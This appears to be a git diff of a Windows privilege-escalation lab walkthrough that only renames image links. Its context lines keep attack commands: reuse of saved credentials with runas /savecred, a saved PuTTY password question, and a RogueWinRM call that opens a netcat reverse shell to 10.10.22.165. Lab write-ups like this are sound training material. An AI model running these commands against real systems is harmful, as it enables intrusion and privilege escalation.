@@ -35,7 +35,7 @@ cmdkey /list
 runas /savecred /user:WPRIVESC1\mike.katz cmd.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (2).png" alt=""><figcaption></figcaption></figure>
 
 **Retrieve the saved password stored in the saved PuTTY session under your profile. What is the password for the thom.smith user?**
 
@@ -263,7 +263,7 @@ nc -lvp 4442
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.10.22.165 4442"
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (7).png" alt=""><figcaption></figcaption></figure>
 
 ## Abusing vulnerable software
 
